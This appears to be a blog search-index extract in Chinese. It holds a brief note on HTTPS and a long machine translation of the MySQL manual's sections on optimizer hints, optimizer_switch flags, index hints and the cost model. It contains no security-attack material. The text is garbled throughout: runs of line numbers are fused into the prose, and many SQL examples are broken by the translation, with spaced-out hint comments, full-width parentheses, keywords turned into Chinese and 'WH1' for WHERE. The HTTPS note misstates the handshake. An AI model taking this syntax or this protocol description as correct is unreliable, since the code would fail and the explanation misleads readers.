    <title><![CDATA[Https协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fhttps%2F</url>
    <content type="text"><![CDATA[http+ssl 使用http进行通信 ssl作为数据通信加密方式 使用非对称方式协商加密密钥、然后使用协商后的密钥进行密钥通信 混合加密方式 非对称加密方式协商加密方式、最后使用加密方式通讯 1、客户端 发送公钥、支持加密方式、版本号 2、服务器接收 公钥加密校验、选择加密方式 放松给客户端 3、客户端接收 服务器选定加密方式进行数据加密 4、使用协商后的加密方式加密http请求]]></content>
      <categories>
        <category>java</category>
        <category>agreement</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【查询器优化·二】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-selector-2%2F</url>
    <content type="text"><![CDATA[8.9.1控制查询计划评估 123456789101112131415161718192021222324252627查询优化器的任务是查找执行SQL查询的最佳计划。由于“ 好 ”和“ 坏 ”之间的表现差异计划可以是数量级（即秒数与数小时甚至数天）， 大多数查询优化器（包括MySQL的查询优化器）在所有可能的查询评估计划中执行或多或少的穷举搜索优化计划。 对于连接查询，由MySQL优化器调查的可能计划的数量随着查询中引用的表的数量呈指数增长。 对于少量表格（通常小于7到10），这不是问题。 但是，当提交更大的查询时，查询优化花费的时间可能很容易成为服务器性能的主要瓶颈。用于查询优化的更灵活的方法使用户能够控制优化器在搜索最优查询评估计划时的详尽程度。总体思路是，优化程序调查的计划越少，编译查询花费的时间就越少。另一方面，因为优化器跳过了一些计划，所以可能会错过找到最佳计划。优化程序相对于其计算的计划数量的行为可以使用两个系统变量进行控制：该optimizer_prune_level 变量告诉优化器根据每个表访问的行数的估计值跳过某些计划。我们的经验表明，这种“ 受过教育的猜测 ”很少会错过最佳计划，并且可能大大减少查询编译时间。这就是为什么这个选项optimizer_prune_level=1默认是on（）。但是，如果您认为优化器错过了更好的查询计划，则可以关闭此选项（optimizer_prune_level=0）与查询编译可能花费更长时间的风险有关。请注意，即使使用这种启发式，优化器仍然会探索大致指数级的计划。这个optimizer_search_depth 变量告诉优化器应该看看每个不完整计划的“ 未来 ”有多远，以评估它是否应该进一步扩展。较小的值 optimizer_search_depth可能会导致查询编译时间缩短几个数量级。例如，如果optimizer_search_depth接近查询中的表的数量，具有12,13或更多表的查询可能很容易需要数小时甚至数天来编译 。同时，如果编译一下 optimizer_search_depth 等于3或4，优化器可以在不到一分钟的时间内编译相同的查询。如果您不确定合理的值是什么 optimizer_search_depth，则可以将此变量设置为0，以通知优化器自动确定该值。 {———-} 8.9.2优化器提示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378控制优化器策略的一种方法是设置 optimizer_switch系统变量（参见第* 8.9.3节“可切换优化”）。对此变量的更改影响所有后续查询的执行; 为了对另一个查询产生不同的影响，有必要optimizer_switch在每个查询之前进行更改 。另一种控制优化器的方式是使用优化器提示，它可以在单个语句中指定。由于优化器提示适用于每个语句的基础上，因此它们提供了对语句执行计划的更好的控制，而不是使用的方式 optimizer_switch。例如，您可以在语句中为一个表启用优化，并禁用针对其他表的优化。语句中的提示优先于 optimizer_switch标志。例子：SELECT / * + NO_RANGE_OPTIMIZATION（t3 PRIMARY，f2_idx）* / f1 FROM t3 where f1&gt; 30 AND f1 &lt;33;SELECT / * + BKA（t1）NO_BKA（t2）* / *从t1 INNER JOIN t2 WHERE ...;SELECT / * + NO_ICP（t1，t2）* / * FROM t1 INNER JOIN t2 WHERE ...;SELECT / * + SEMIJOIN（FIRSTMATCH，LOOSESCAN）* / * FROM t1 ...;EXPLAIN SELECT / * + NO_ICP（t1）* / * FROM t1 WHERE ...;注意默认情况下 ，mysql客户端从发送到服务器的SQL语句（包括优化器提示）中删除注释，直到MySQL 5.7.7更改为将优化器提示传递给服务器。为了确保如果您使用旧版本的mysql客户端与理解优化器提示的服务器版本，优化器提示不会被剥离，请使用 该 选项调用 mysql--comments。此处介绍的优化器提示与第8.9.4节“索引提示”中介绍的索引提示有所不同。优化器和索引提示可以单独使用或一起使用。优化器提示概述优化器提示语法表级优化器提示索引级优化器提示子查询优化器提示语句执行时间优化器提示用于命名查询块的优化器提示优化器提示概述优化器提示适用于不同的范围级别：全局：提示影响整个陈述查询块：提示影响语句中的特定查询块表级别：提示影响查询块中的特定表索引级别：提示影响表格中的特定索引下表总结了可用的优化器提示，它们影响的优化器策略以及它们所应用的范围。更多细节在后面给出。表8.2可用的优化器提示提示名称 描述 适用范围BKA， NO_BKA 影响批量键访问连接处理 查询块，表BNL， NO_BNL 影响块嵌套循环连接处理 查询块，表MAX_EXECUTION_TIME 限制语句执行时间 全球MRR， NO_MRR 影响多范围读取优化 表，索引NO_ICP 影响索引条件下推优化 表，索引NO_RANGE_OPTIMIZATION 影响范围优化 表，索引QB_NAME 将名称分配给查询块 查询块SEMIJOIN， NO_SEMIJOIN 影响半连接策略 查询块SUBQUERY 影响物化， IN至- EXISTS 子查询配置的对策探讨 查询块禁用优化可防止优化器使用它。启用优化意味着如果优化程序适用于语句执行，则可以自由使用策略，而不是优化程序必须使用它。优化器提示语法如第9.6节“注释语法”中所述，MySQL支持SQL语句中的 注释。优化器提示必须在/*+ ... */注释中指定。也就是说，优化器提示使用/* ... */ C样式注释语法的变体，并+在/*注释打开序列后面加上一个字符。例子：/ * + BKA（t1）* // * + BNL（t1，t2）* // * + NO_RANGE_OPTIMIZATION（t4 PRIMARY）* // * + QB_NAME（qb2）* /在+ 字符后面允许使用空格。分析器的初始关键字后承认优化提示意见SELECT， UPDATE， INSERT， REPLACE，和 DELETE语句。在这些情况下允许提示：在查询和数据更改语句的开始处：SELECT / * + ... * / ...INSERT / * + ... * / ...REPLACE / * + ... * / ...UPDATE / * + ... * / ...删除/ * + ... * / ...在查询块的开始处：（SELECT / * + ... * / ...）（SELECT ...）UNION（SELECT / * + ... * / ...）（SELECT / * + ... * / ...）UNION（SELECT / * + ... * / ...）UPDATE ... WHERE x IN（SELECT / * + ... * / ...）INSERT ... SELECT / * + ... * / ...在由...开头的暗示性陈述中 EXPLAIN。例如：EXPLAIN SELECT / * + ... * / ...EXPLAIN UPDATE ... WHERE x IN（SELECT / * + ... * / ...）这意味着您可以使用它 EXPLAIN来查看优化器提示如何影响执行计划。SHOW WARNINGS之后立即使用 EXPLAIN，看看如何使用提示。EXPLAIN 以下SHOW WARNINGS显示的扩展输出指示使用了哪些提示。不显示忽略的提示。提示注释可能包含多个提示，但查询块不能包含多个提示注释。这是有效的：SELECT / * + BNL（t1）BKA（t2）* / ...但这是无效的：SELECT / * + BNL（t1）* / / * BKA（t2）* / ...当提示注释包含多个提示时，存在重复和冲突的可能性。以下一般准则适用。对于特定的提示类型，可能会应用其他规则，如提示说明中所述。重复提示：对于一个提示，如/*+ MRR(idx1) MRR(idx1) */MySQL使用第一个提示并发出关于重复提示的警告。冲突提示：对于一个提示，如/*+ MRR(idx1) NO_MRR(idx1) */MySQL使用第一个提示并发出关于第二个冲突提示的警告。查询块名称是标识符，并遵循关于哪些名称有效以及如何引用它们的通用规则（请参见 第9.2节“模式对象名称”）。提示名称，查询块名称和策略名称不区分大小写。对表和索引名称的引用遵循通常的标识符区分大小写规则（请参见 第9.2.2节“标识符区分大小写”）。表级优化器提示表级提示影响使用块嵌套循环（BNL）和（BKA）成批键访问的加入处理算法（参见 第8.2.1.11，“块嵌套循环和成批键访问联接”）。这些提示类型适用于特定表或查询块中的所有表。表级提示的语法：hint_name（[@ query_block_name] [ tbl_name[，tbl_name] ...]） hint_name（[ tbl_name@ query_block_name[，tbl_name@ query_block_name] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：BKA，NO_BKA：为指定的表启用或禁用BKA。BNL，NO_BNL：启用或禁用指定表的BNL。注意要使用BNL或BKA提示为外连接的任何内部表启用连接缓冲，必须为外连接的所有内部表启用连接缓冲。tbl_name：声明中使用的表的名称。该提示适用于它命名的所有表。如果提示不命名表，它将应用于它发生的查询块的所有表。如果表有别名，提示必须引用别名，而不是表名。提示中的表名称不能用模式名称限定。query_block_name：提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。对于 语法，该提示适用于指定查询块中的指定表。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_nametbl_name@query_block_name例子：SELECT / * + NO_BKA（t1，t2）* / t1。* FROM t1 INNER JOIN t2 INNER JOIN t3;SELECT / * + NO_BNL（）BKA（t1）* / t1。* FROM t1 INNER JOIN t2 INNER JOIN t3;表级提示适用于从前面的表中接收记录的表，而不是发送者表。考虑这个说法：SELECT / * + BNL（t2）* / FROM t1，t2;如果优化器选择t1 首先进行处理，则会在开始读取之前 t2通过缓冲行来 应用块嵌套循环连接 。如果优化器选择首先处理，则提示不起作用，因为是发送者表。 t1t2t2t2索引级优化器提示索引级提示会影响优化程序对特定表或索引使用的索引处理策略。这些提示类型影响使用索引条件下推（ICP），多范围读取（MRR）和范围优化（请参见 第8.2.1节“优化SELECT语句”）。索引级提示的语法：hint_name（[@ query_block_name] tbl_name[ index_name[，index_name] ...]） hint_name（tbl_name@ query_block_name[ index_name[，index_name] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：MRR，NO_MRR：启用或禁用指定表或索引的MRR。MRR提示仅适用于 表格InnoDB和 MyISAM表格。NO_ICP：为指定的表或索引禁用ICP。默认情况下，ICP是一个候选优化策略，所以没有启用它的提示。NO_RANGE_OPTIMIZATION：禁用指定表或索引的索引范围访问。此提示还会禁用索引合并和索引扫描以查找表或索引。默认情况下，范围访问是一个候选优化策略，所以没有启用它的提示。当范围数可能很高并且范围优化需要许多资源时，这个提示可能是有用的。tbl_name：提示适用的表格index_name：指定表中索引的名称。该提示适用于它命名的所有索引。如果提示不命名索引，则它适用于表中的所有索引。要引用主键，请使用该名称 PRIMARY。要查看表格的索引名称，请使用SHOW INDEX。query_block_name：提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。对于 语法，该提示适用于指定查询块中的指定表。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_nametbl_name@query_block_name例子：SELECT / * + MRR（t1）* / * FROM t1 WHERE f2 &lt;= 3 AND 3 &lt;= f3;SELECT / * + NO_RANGE_OPTIMIZATION（t3 PRIMARY，f2_idx）* / f1 FROM t3 where f1&gt; 30 AND f1 &lt;33;INSERT INTO t3（f1，f2，f3） （SELECT / * + NO_ICP（t2）* / t2.f1，t2.f2，t2.f3 FROM t1，t2 WHERE t1.f1 = t2.f1 AND t2.f2 BETWEEN t1.f1 AND t1.f2 AND t2.f2 + 1&gt; = t1.f1 + 1）;子查询优化器提示子查询提示影响是否使用半连接的转换和半连接策略允许，而当半联接未使用，是否使用子查询物化或 IN至- EXISTS 变换。有关这些优化的更多信息，请参见第8.2.2节“优化子查询，派生表和视图引用”。影响半连接策略的提示语法：hint_name（[@ query_block_name] [ strategy[，strategy] ...]）语法引用了这些术语：hint_name：这些提示名称是允许的：SEMIJOIN， NO_SEMIJOIN：启用或禁用指定的半连接策略。strategy：启用或禁用半连接策略。这些策略名允许：DUPSWEEDOUT， FIRSTMATCH， LOOSESCAN， MATERIALIZATION。对于SEMIJOIN提示，如果未命名策略，则根据optimizer_switch系统变量启用的策略，尽可能使用半连接 。如果战略被命名但不适用于该声明，DUPSWEEDOUT则会被使用。对于NO_SEMIJOIN提示，如果没有策略被命名，则不使用半连接。如果策略被命名为排除声明的所有适用策略，DUPSWEEDOUT则使用该策略 。如果一个子查询嵌套在另一个子查询中，并且两者都合并到外部查询的半连接中，则最内层查询的任何半连接策略规范都将被忽略。 SEMIJOIN并且NO_SEMIJOIN 仍然可以使用提示来启用或禁用此类嵌套子查询的半连接转换。如果DUPSWEEDOUT被禁用，则有时优化器可能会生成一个远离最佳状态的查询计划。这发生在贪婪搜索期间的启发式修剪，可以通过设置来避免 optimizer_prune_level=0。例子：SELECT / * + NO_SEMIJOIN（@ subq1 FIRSTMATCH，LOOSESCAN）* / *从t2 WHERE t2.a IN（SELECT / * + QB_NAME（subq1）* / a FROM t3）;SELECT / * + SEMIJOIN（@ subq1 MATERIALIZATION，DUPSWEEDOUT）* / *从t2开始 WHERE t2.a IN（SELECT / * + QB_NAME（subq1）* / a FROM t3）;影响是否使用子查询实现或IN-to- EXISTS 转换的提示语法 ：SUBQUERY（[@ query_block_name] strategy）提示名称总是SUBQUERY。对于SUBQUERY提示，这些 strategy值是允许的： INTOEXISTS， MATERIALIZATION。例子：SELECT id，IN（SELECT / * + SUBQUERY（MATERIALIZATION）* / a FROM t1）FROM t2;SELECT * FROM t2 WHERE t2.a IN（SELECT / * + SUBQUERY（INTOEXISTS）* / a FROM t1）;对于半连接和SUBQUERY提示，前导 指定提示适用的查询块。如果提示不包含前导 ，则该提示将应用于其发生的查询块。要为查询块分配名称，请参阅 命名查询块的优化器提示。 @query_block_name@query_block_name如果提示注释包含多个子查询提示，则使用第一个。如果还有其他类型的提示，则会发出警告。其他类型的提示被默默忽略。语句执行时间优化器提示该MAX_EXECUTION_TIME提示仅适用于SELECT语句。它N在语句允许在服务器终止之前执行多长时间内放置一个限制（以毫秒为单位的超时值）：MAX_EXECUTION_TIME（N）超时时间为1秒（1000毫秒）的示例：SELECT / * + MAX_EXECUTION_TIME（1000）* / *从t1 INNER JOIN t2 WHERE ...该 提示设置了毫秒的语句执行超时 。如果此选项不存在或为0，则由系统变量建立的语句超时 适用。 MAX_EXECUTION_TIME(N)NNmax_execution_time该MAX_EXECUTION_TIME提示适用如下：对于具有多个SELECT 关键字的语句（例如具有子查询的联合或语句） MAX_EXECUTION_TIME适用于整个语句，并且必须出现在第一个语句之后 SELECT。它适用于只读 SELECT语句。不是只读的语句是那些调用一个存储函数，将数据修改为副作用的语句。它不适用于SELECT 存储程序中的语句，并且被忽略。用于命名查询块的优化器提示表级别，索引级别和子查询优化器提示允许将特定查询块命名为其参数语法的一部分。要创建这些名称，请使用 QB_NAME提示，它为其发生的查询块分配一个名称：QB_NAME（name）QB_NAME提示可以用来清楚地明确哪些查询块适用于其他提示。它们还允许在单个提示注释中指定所有非查询块名称提示，以便于理解复杂语句。考虑以下声明：选择 ... FROM（SELECT ... FROM（SELECT ... FROM ...））...QB_NAME 提示为语句中的查询块分配名称：SELECT / * + QB_NAME（qb1）* / ... FROM（SELECT / * + QB_NAME（qb2）* / ... FROM（SELECT / * + QB_NAME（qb3）* / ... FROM ...））...然后其他提示可以使用这些名称来引用适当的查询块：SELECT / * + QB_NAME（qb1）MRR（@ qb1 t1）BKA（@ qb2）NO_MRR（@ qb3t1 idx1，id2）* / ... FROM（SELECT / * + QB_NAME（qb2）* / ... FROM（SELECT / * + QB_NAME（qb3）* / ... FROM ...））...其结果如下所示：MRR(@qb1 t1)适用t1于查询块中的 表格 qb1。BKA(@qb2)适用于查询块 qb2。NO_MRR(@qb3 t1 idx1, id2)适用于索引idx1和 查询块idx2中的表格。 t1qb3查询块名称是标识符，并遵循关于哪些名称有效以及如何引用它们的通用规则（请参见 第9.2节“模式对象名称”）。例如，包含空格的查询块名称必须用引号引起来，这可以使用反引号来完成：SELECT / * + BKA（@`my hint name`）* / ... FROM（SELECT / * + QB_NAME（`my hint name`）* / ...）...如果ANSI_QUOTES启用了SQL模式，则也可以在双引号内引用查询块名称：SELECT / * + BKA（@“my hint name”）* / ... FROM（SELECT / * + QB_NAME（“my hint name”）* / ...）... 8.9.3可切换优化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258该optimizer_switch系统变量能够在优化行为的控制。它的值是一组标志，每个标志都有一个值on 或off表示相应的优化器行为是启用还是禁用。该变量具有全局和会话值，并且可以在运行时更改。全局默认值可以在服务器启动时设置。要查看当前的优化器标志集，请选择变量值：MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = on， index_merge_sort_union =开， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开，duplicateweedout =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =开，derived_merge =上要更改值 optimizer_switch，请分配一个由逗号分隔的一个或多个命令列表组成的值：SET [GLOBAL | SESSION] optimizer_switch =&apos; command[，command] ...&apos;;每个command值应具有下表中显示的一种形式。命令语法 含义default 将每个优化重置为默认值opt_name=default 将指定的优化设置为其默认值opt_name=off 禁用命名优化opt_name=on 启用指定的优化该值中的命令顺序无关紧要，但该default命令如果存在则首先执行。一个设置opt_name标志 default设置它取的 on或者off是它的默认值。opt_name 不允许多次指定给定的值并导致错误。值中的任何错误都会导致分配失败，并显示错误，并使值 optimizer_switch保持不变。以下列表描述了opt_name按优化策略分组的允许 标志名称：批量键访问标志batched_key_access（默认 off）控制BKA连接算法的使用。为了batched_key_access在设置时有任何效果on，该 mrr标志也必须是 on。目前，MRR的成本估算过于悲观。因此，也有必要对 mrr_cost_based要 off用于要使用的BKA。有关更多信息，请参见 第8.2.1.11节“块嵌套循环和批处理键访问联接”。块嵌套循环标志block_nested_loop（默认 on）控制使用BNL连接算法。有关更多信息，请参见 第8.2.1.11节“块嵌套循环和批处理键访问联接”。条件过滤标志condition_fanout_filter（默认 on）控制条件过滤的使用。派生表合并标志derived_merge（默认 on）控制派生表和视图到外部查询块的合并。该derived_merge标志控制优化程序是否尝试合并派生表并将引用视为外部查询块，假设没有其他规则会阻止合并; 例如，ALGORITHM视图的 指令优先于该derived_merge 设置。 默认情况下，该标志on用于启用合并。有关更多信息，请参见 第8.2.2.3节“优化派生表和视图引用”。引擎状况下推标志engine_condition_pushdown（默认 on）控制发动机状况下推。有关更多信息，请参见 第8.2.1.4节“引擎状况下推优化”。索引条件下推标志index_condition_pushdown（默认 on）控制索引条件下推。有关更多信息，请参见 第8.2.1.5节“索引条件下推优化”。索引扩展标志use_index_extensions（默认 on）控制索引扩展的使用。有关更多信息，请参见 第8.3.9节“使用索引扩展”。索引合并标志index_merge（默认 on）控制所有索引合并优化。index_merge_intersection（默认 on）控制索引合并相交访问优化。index_merge_sort_union（默认 on）控制索引合并排序 - 联合访问优化。index_merge_union（默认 on）控制索引合并联盟访问优化。有关更多信息，请参见 第8.2.1.3节“索引合并优化”。多范围读取标志mrr（默认on）控制多范围读取策略。mrr_cost_based（默认 on）控制使用基于成本的MRR mrr=on。有关更多信息，请参见 第8.2.1.10节“多范围读取优化”。半连接标志semijoin（默认 on）控制所有半连接策略。duplicateweedout（默认 on）控制半联合Duplicate Weedout策略。firstmatch（默认 on）控制半连接的FirstMatch策略。loosescan（默认 on）控制半连接LooseScan策略（不要与LooseScan混淆GROUP BY）。在semijoin， firstmatch，loosescan，和duplicateweedout超过半连接策略的标志使能控制。该semijoin 标志控制是否使用半连接。如果它被设置为 on，在firstmatch和 loosescan标志启用了允许半连接策略更精细的控制。如果duplicateweedout禁用半连接策略，则不会使用半连接策略，除非所有其他适用策略也被禁用。如果semijoin和 materialization是两个 on，半连接也适用使用物化。这些标志是on默认的。有关更多信息，请参见第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。子查询物化标志materialization（默认 on）控制实现（包括半连接实现）。subquery_materialization_cost_based （默认on）使用基于成本的物化选择。该materialization标志控制是否使用子查询实现。如果 semijoin和 materialization是两个 on，半连接也适用使用物化。这些标志是on默认的。该subquery_materialization_cost_based 标志使得能够在子查询物化和之间的选择控制 IN-到- EXISTS子查询变换。如果该标志为on（默认值），优化器进行子查询物化和之间的基于成本的选择 IN-到- EXISTS子查询变换如果可以使用任一方法。如果标志是off，优化器选择了子查询物化 IN至- EXISTS子查询的转变。有关更多信息，请参见 第8.2.2节“优化子查询，派生表和视图引用”。当您为其赋值时 optimizer_switch，未提及的标志会保留其当前值。这样可以在单个语句中启用或禁用特定的优化器行为，而不会影响其他行为。该语句不依赖于其他优化器标志存在以及它们的值是什么。假设启用了所有索引合并优化：MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = on， index_merge_sort_union =开， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =上如果服务器对某些查询使用索引合并联合或索引合并排序联合访问方法，并且您希望检查优化程序在没有它们的情况下是否会更好地执行，请设置变量值，如下所示：MySQL的&gt; SET optimizer_switch=&apos;index_merge_union=off,index_merge_sort_union=off&apos;;MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = off， index_merge_sort_union =关， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =上 8.9.4索引提示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132索引提示为优化程序提供有关如何在查询处理期间选择索引的信息。这里描述的索引提示与第8.9.2节“优化器提示”中描述的 优化器提示不同。索引和优化器提示可以单独使用或一起使用。索引提示是按照表名指定的。（有关在语句中指定表的一般语法 SELECT，请参见 第13.2.9.2节“JOIN语法”。）引用单个表（包括索引提示）的语法如下所示：tbl_name[[AS] alias] [ index_hint_list]index_hint_list： index_hint[ index_hint] ...index_hint： USE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（[ index_list]） | IGNORE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（index_list） | FORCE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（index_list）index_list： index_name[，index_name] ...该提示告诉MySQL只使用其中一个命名索引来查找表中的行。另一种语法告诉MySQL不要使用某些特定的索引或索引。如果显示MySQL使用可能索引列表中的错误索引，这些提示很有用。 USE INDEX (index_list)IGNORE INDEX (index_list)EXPLAIN这个FORCE INDEX提示的作用就像，另外一个表扫描被认为是 非常昂贵的。换句话说，只有在无法使用某个指定索引在表中查找行时才使用表扫描。 USE INDEX (index_list)每个提示都需要索引名称，而不是列名。要引用主键，请使用该名称PRIMARY。要查看表的索引名称，请使用该SHOW INDEX语句或 INFORMATION_SCHEMA.STATISTICS 表。一个index_name值不一定是一个完整的索引名称。它可以是索引名称的明确前缀。如果前缀不明确，则会发生错误。例子：SELECT * FROM table1 USE INDEX（col1_index，col2_index） WH1 col1 = 1 AND col2 = 2 AND col3 = 3;SELECT * FROM table1 IGNORE INDEX（col3_index） WH1 col1 = 1 AND col2 = 2 AND col3 = 3;索引提示的语法具有以下特征：它在语法上是有效的，省略 index_list了USE INDEX，这意味着“ 不使用索引。” 省略index_list的 FORCE INDEX或者IGNORE INDEX是一个语法错误。您可以通过向提示添加FOR子句来指定索引提示的范围 。这提供了对查询处理的各个阶段的执行计划的优化器选择的更细粒度的控制。要仅影响MySQL决定如何在表中查找行以及如何处理连接时使用的索引，请使用FOR JOIN。要影响用于排序或分组行的索引使用情况，请使用FOR ORDER BY或 FOR GROUP BY。您可以指定多个索引提示：SELECT * FROM t1 USE INDEX（i1）IGNORE INDEX FOR ORDER BY（i2）ORDER BY a;在几个提示中命名相同的索引（即使在相同的提示中）也不是错误的：SELECT * FROM t1 USE INDEX（i1）USE INDEX（i1，i1）;但是，它是混合错误USE INDEX 和FORCE INDEX同一个表：SELECT * FROM t1 USE INDEX FOR JOIN（i1）FORCE INDEX FOR JOIN（i2）;如果索引提示不包含FOR子句，则提示的范围将应用于语句的所有部分。例如，这个提示：IGNORE INDEX（i1）相当于这种提示的组合：IGNORE索引加入（i1）IGNORE索引（ORDER BY）（i1）IGNORE INDEX FOR GROUP BY（i1）在MySQL 5.0中，不带FOR子句的提示范围仅适用于行检索。当不存在FOR子句时，要使服务器使用此旧行为，请old在服务器启动时启用系统变量。注意在复制设置中启用此变量。使用基于语句的二进制日志记录时，主服务器和从服务器使用不同的模式可能会导致复制错误。当索引提示进行处理，它们是由式（收集在一个单一的列表USE，FORCE， IGNORE）和范围（FOR JOIN，FOR ORDER BY，FOR GROUP BY）。例如：SELECT * FROM t1 USE INDEX（）IGNORE INDEX（i2）USE INDEX（i1）USE INDEX（i2）;相当于：SELECT * FROM t1 USE INDEX（i1，i2）IGNORE INDEX（i2）;索引提示然后按以下顺序应用于每个范围：&#123;USE|FORCE&#125; INDEX如果存在，则应用。（如果不是，则使用优化程序确定的一组索引。）IGNORE INDEX应用于上一步的结果。例如，以下两个查询是等同的：SELECT * FROM t1 USE INDEX（i1）IGNORE INDEX（i2）USE INDEX（i2）;SELECT * FROM t1 USE INDEX（i1）;对于FULLTEXT搜索，索引提示的工作如下：对于自然语言模式搜索，索引提示将被忽略。例如，IGNORE INDEX(i1)在没有警告的情况下被忽略，索引仍然被使用。对于布尔模式搜索，带有FOR ORDER BY或者的索引提示FOR GROUP BY默默忽略。带有FOR JOIN或不带FOR修饰符的索引提示将得到遵守。与提示如何应用于非FULLTEXT搜索相反，该提示用于查询执行的所有阶段（查找行和检索，分组和排序）。即使给出非FULLTEXT索引的提示，也是如此。例如，以下两个查询是等同的：SELECT * FROM t USE INDEX（index1） IGNORE INDEX（index1）用于ORDER BY IGNORE INDEX（index1）适用于GROUP BY 在......布尔模式中......;SELECT * FROM t USE INDEX（index1） 在......布尔模式中......; 8.9.5优化器成本模型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205为了生成执行计划，优化器使用基于对查询执行期间发生的各种操作的成本进行估计的成本模型。优化器具有一组可编辑的默认“ 成本常量 ”，可用于制定有关执行计划的决策。优化器还具有执行计划构建过程中使用的成本估算数据库。这些估计值存储在中server_cost和 engine_cost在表 mysql系统数据库中，随时可配置的。这些表的目的是使它能够轻松调整优化器在尝试到达查询执行计划时使用的成本估计。成本模型一般操作成本模型数据库对成本模型数据库进行更改成本模型一般操作可配置的优化器成本模型如下所示：服务器在启动时将成本模型表读入内存，并在运行时使用内存中的值。NULL表中指定的任何非成本估算优先于相应的编译缺省成本常数。任何NULL 估计都会向优化器指示使用编译的默认值。在运行时，服务器可能重新读取成本表。当存储引擎动态加载或FLUSH OPTIMIZER_COSTS 执行语句时会发生这种情况。成本表使服务器管理员能够通过更改表中的条目来轻松调整成本估算。通过将条目的成本设置为，也很容易恢复为默认值NULL。优化程序使用内存中的开销值，因此对表的更改应随后FLUSH OPTIMIZER_COSTS生效。当客户端会话开始时，当前内存中的成本估算适用于整个会话，直到它结束。特别是，如果服务器重新读取成本表格，则任何更改的估算值仅适用于随后开始的会话。现有会话不受影响。成本表特定于给定的服务器实例。服务器不会将成本表更改复制到复制从服务器。成本模型数据库优化器成本模型数据库由mysql系统数据库中的两个表组成，其中包含查询执行期间发生的操作的成本估算信息：server_cost：一般服务器操作的优化器成本估算engine_cost：特定于特定存储引擎的操作的优化器成本估算该server_cost表包含这些列：cost_name成本模型中使用的成本估算的名称。名称不区分大小写。如果服务器在读取此表时未识别成本名称，则会向错误日志写入警告。cost_value成本估算值。如果该值不是NULL，则服务器将其用作成本。否则，它使用默认估计值（编译值）。DBA可以通过更新此列来更改成本估算。如果服务器在读取此表时发现成本值无效（非正确），则会向错误日志写入警告。要覆盖默认成本估算（对于指定的条目NULL），请将成本设置为非NULL值。要恢复为默认值，请将该值设置为NULL。然后执行FLUSH OPTIMIZER_COSTS以通知服务器重新读取成本表。last_update最后一行更新的时间。comment与成本估算相关的描述性评论。DBA可以使用此列来提供有关成本估算行为何存储特定值的信息。该server_cost表的主键是cost_name列，因此不可能为任何成本估算创建多个条目。服务器识别这些表的cost_name 值server_cost：disk_temptable_create_cost（默认40.0），disk_temptable_row_cost（默认1.0）存储在基于磁盘的存储引擎（InnoDB或者MyISAM）中的内部创建的临时表的成本估算 。增加这些值会增加使用内部临时表的成本估计值，并使优化程序偏好使用较少的查询计划。有关这些表的信息，请参见 第8.4.4节“MySQL中的内部临时表使用”。与相应内存参数（memory_temptable_create_cost， memory_temptable_row_cost）的默认值相比， 这些磁盘参数的较大默认值反映了处理基于磁盘的表的较高成本。key_compare_cost 